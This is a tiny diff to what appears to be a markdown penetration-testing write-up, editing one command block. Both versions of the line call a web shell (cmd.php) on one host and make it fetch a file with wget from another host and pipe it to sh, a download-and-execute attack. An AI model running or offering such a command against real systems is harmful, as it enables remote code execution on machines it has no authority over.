@@ -159,7 +159,7 @@
   ```
  
   ```cmd
-  http://192.168.1.3/cmd.php?cmd=wget -qO- 192.168.1.2:6666/index.html|sh
+  http://192.168.1.3/cmd.php?cmd=wget -qO- 192.168.1.2/index.html|sh
   ```
  
   ---
